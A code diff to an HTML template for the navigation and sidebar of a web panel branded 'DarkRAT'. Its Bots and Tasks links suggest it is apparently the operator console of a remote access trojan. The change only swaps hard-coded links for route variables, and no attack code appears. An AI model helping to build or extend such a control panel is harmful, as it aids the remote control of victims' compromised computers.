@@ -2,7 +2,7 @@
     <nav class="navbar navbar-expand-lg">
         <div class="container-fluid d-flex align-items-center justify-content-between">
             <div class="navbar-header">
-                <!-- Navbar Header--><a href="/dashboard" class="navbar-brand">
+                <!-- Navbar Header--><a href="{$defaulRoutes["Main@index"]}" class="navbar-brand">
                     <div class="brand-text brand-big visible text-uppercase"><strong class="text-primary">Dark</strong><strong>RAT</strong></div>
                     <div class="brand-text brand-sm">D<strong>R</strong></div></a>
                 <!-- Sidebar Toggle Btn-->
@@ -16,7 +16,7 @@
                 </div>
                 -->
                 <!-- Log out               -->
-                <div class="list-inline-item logout">                   <a id="logout" href="/logout" class="nav-link"> <span class="d-none d-sm-inline">Logout </span><i class="icon-logout"></i></a></div>
+                <div class="list-inline-item logout">                   <a id="logout" href="/{$defaulRoutes["Main@logout"]}" class="nav-link"> <span class="d-none d-sm-inline">Logout </span><i class="icon-logout"></i></a></div>
             </div>
         </div>
     </nav>
@@ -26,12 +26,11 @@
     <!-- Sidebar Navigation-->
     <nav id="sidebar">
         <!-- Sidebar Header-->
-
         <ul class="list-unstyled">
-            <li class=""><a href="/dashboard"> <i class="icon-home"></i>Home </a></li>
-            <li class=""><a href="/tasks"> <i class="icon-list"></i>Tasks </a></li>
-            <li class=""><a href="/bots"> <i class="icon-computer"></i>Bots </a></li>
-            <li class=""><a href="/settings"> <i class="icon-settings"></i>Settings </a></li>
+            <li class=""><a href="{$defaulRoutes["Main@index"]}"> <i class="icon-home"></i>Home </a></li>
+            <li class=""><a href="{$defaulRoutes["Main@tasks"][0]}"> <i class="icon-list"></i>Tasks </a></li>
+            <li class=""><a href="{$defaulRoutes["Main@bots"]}"> <i class="icon-computer"></i>Bots </a></li>
+            <li class=""><a href="{$defaulRoutes["Main@settings"]}"> <i class="icon-settings"></i>Settings </a></li>
 <!--
             <li><a href="#exampledropdownDropdown" aria-expanded="false" data-toggle="collapse"> <i class="icon-windows"></i>Example dropdown </a>
                 <ul id="exampledropdownDropdown" class="collapse list-unstyled ">
